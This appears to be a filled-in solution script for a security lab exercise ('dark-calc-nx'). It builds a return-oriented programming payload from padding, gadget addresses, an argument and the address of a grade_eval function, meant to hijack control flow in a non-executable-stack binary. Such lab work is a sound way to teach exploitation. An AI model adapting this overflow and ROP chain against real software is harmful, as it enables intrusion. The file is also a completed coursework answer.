#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x401A33
RET = 0x401A35
grade_eval = 0x401978

payload = (
    b"A" * 16
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(grade_eval)
    + p64(0x4019B4)
)

sys.stdout.buffer.write(payload)
